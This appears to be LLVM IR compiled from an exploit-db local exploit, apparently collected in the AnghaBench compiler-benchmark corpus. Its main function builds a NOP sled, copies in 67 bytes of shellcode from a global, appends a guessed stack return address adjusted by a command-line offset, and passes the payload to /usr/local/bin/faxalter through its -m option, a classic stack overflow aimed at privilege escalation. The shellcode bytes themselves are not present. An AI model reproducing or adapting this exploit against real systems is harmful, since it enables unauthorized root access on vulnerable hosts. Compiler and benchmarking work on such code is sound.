; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_19590.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_19590.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [30 x i8] c"eip=0x%x offset=%d buflen=%d\0A\00", align 1
@.str.1 = private unnamed_addr constant [12 x i8] c"NOPs to %d\0A\00", align 1
@shell = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [17 x i8] c"Shellcode to %d\0A\00", align 1
@.str.3 = private unnamed_addr constant [11 x i8] c"eip to %d\0A\00", align 1
@.str.4 = private unnamed_addr constant [24 x i8] c"/usr/local/bin/faxalter\00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c"faxalter\00", align 1
@.str.6 = private unnamed_addr constant [3 x i8] c"-m\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  %12 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  store i32 4093, i32* %9, align 4
  %13 = load i32, i32* %9, align 4
  %14 = zext i32 %13 to i64
  %15 = call i8* @llvm.stacksave()
  store i8* %15, i8** %10, align 8
  %16 = alloca i8, i64 %14, align 16
  store i64 %14, i64* %11, align 8
  store i32 -1077948499, i32* %12, align 4
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 1
  %19 = load i8*, i8** %18, align 8
  %20 = icmp ne i8* %19, null
  br i1 %20, label %21, label %29

21:                                               ; preds = %2
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 1
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 @atoi(i8* %24)
  store i32 %25, i32* %8, align 4
  %26 = load i32, i32* %12, align 4
  %27 = load i32, i32* %8, align 4
  %28 = add nsw i32 %26, %27
  store i32 %28, i32* %12, align 4
  br label %29

29:                                               ; preds = %21, %2
  %30 = load i32, i32* @stderr, align 4
  %31 = load i32, i32* %12, align 4
  %32 = load i32, i32* %8, align 4
  %33 = load i32, i32* %9, align 4
  %34 = call i32 (i32, i8*, i32, ...) @fprintf(i32 %30, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str, i64 0, i64 0), i32 %31, i32 %32, i32 %33)
  store i32 0, i32* %6, align 4
  br label %35

35:                                               ; preds = %42, %29
  %36 = load i32, i32* %6, align 4
  %37 = icmp slt i32 %36, 4021
  br i1 %37, label %38, label %45

38:                                               ; preds = %35
  %39 = load i32, i32* %6, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %16, i64 %40
  store i8 -112, i8* %41, align 1
  br label %42

42:                                               ; preds = %38
  %43 = load i32, i32* %6, align 4
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* %6, align 4
  br label %35

45:                                               ; preds = %35
  %46 = load i32, i32* @stderr, align 4
  %47 = load i32, i32* %6, align 4
  %48 = call i32 (i32, i8*, i32, ...) @fprintf(i32 %46, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0), i32 %47)
  store i32 0, i32* %7, align 4
  br label %49

49:                                               ; preds = %61, %45
  %50 = load i32, i32* %7, align 4
  %51 = icmp slt i32 %50, 67
  br i1 %51, label %52, label %66

52:                                               ; preds = %49
  %53 = load i8*, i8** @shell, align 8
  %54 = load i32, i32* %7, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds i8, i8* %53, i64 %55
  %57 = load i8, i8* %56, align 1
  %58 = load i32, i32* %6, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %16, i64 %59
  store i8 %57, i8* %60, align 1
  br label %61

61:                                               ; preds = %52
  %62 = load i32, i32* %6, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %6, align 4
  %64 = load i32, i32* %7, align 4
  %65 = add nsw i32 %64, 1
  store i32 %65, i32* %7, align 4
  br label %49

66:                                               ; preds = %49
  %67 = load i32, i32* @stderr, align 4
  %68 = load i32, i32* %6, align 4
  %69 = call i32 (i32, i8*, i32, ...) @fprintf(i32 %67, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.2, i64 0, i64 0), i32 %68)
  %70 = load i32, i32* %12, align 4
  %71 = and i32 %70, 255
  %72 = trunc i32 %71 to i8
  %73 = load i32, i32* %6, align 4
  %74 = add nsw i32 %73, 1
  store i32 %74, i32* %6, align 4
  %75 = sext i32 %73 to i64
  %76 = getelementptr inbounds i8, i8* %16, i64 %75
  store i8 %72, i8* %76, align 1
  %77 = load i32, i32* %12, align 4
  %78 = and i32 %77, 65280
  %79 = ashr i32 %78, 8
  %80 = trunc i32 %79 to i8
  %81 = load i32, i32* %6, align 4
  %82 = add nsw i32 %81, 1
  store i32 %82, i32* %6, align 4
  %83 = sext i32 %81 to i64
  %84 = getelementptr inbounds i8, i8* %16, i64 %83
  store i8 %80, i8* %84, align 1
  %85 = load i32, i32* %12, align 4
  %86 = and i32 %85, 16711680
  %87 = ashr i32 %86, 16
  %88 = trunc i32 %87 to i8
  %89 = load i32, i32* %6, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %6, align 4
  %91 = sext i32 %89 to i64
  %92 = getelementptr inbounds i8, i8* %16, i64 %91
  store i8 %88, i8* %92, align 1
  %93 = load i32, i32* %12, align 4
  %94 = and i32 %93, -16777216
  %95 = lshr i32 %94, 24
  %96 = trunc i32 %95 to i8
  %97 = load i32, i32* %6, align 4
  %98 = add nsw i32 %97, 1
  store i32 %98, i32* %6, align 4
  %99 = sext i32 %97 to i64
  %100 = getelementptr inbounds i8, i8* %16, i64 %99
  store i8 %96, i8* %100, align 1
  %101 = load i32, i32* @stderr, align 4
  %102 = load i32, i32* %6, align 4
  %103 = call i32 (i32, i8*, i32, ...) @fprintf(i32 %101, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i64 0, i64 0), i32 %102)
  %104 = load i32, i32* %9, align 4
  %105 = sub nsw i32 %104, 1
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i8, i8* %16, i64 %106
  store i8 0, i8* %107, align 1
  %108 = call i32 @execl(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0), i8* %16, i32* null)
  %109 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %109)
  %110 = load i32, i32* %3, align 4
  ret i32 %110
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @fprintf(i32, i8*, i32, ...) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i32*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
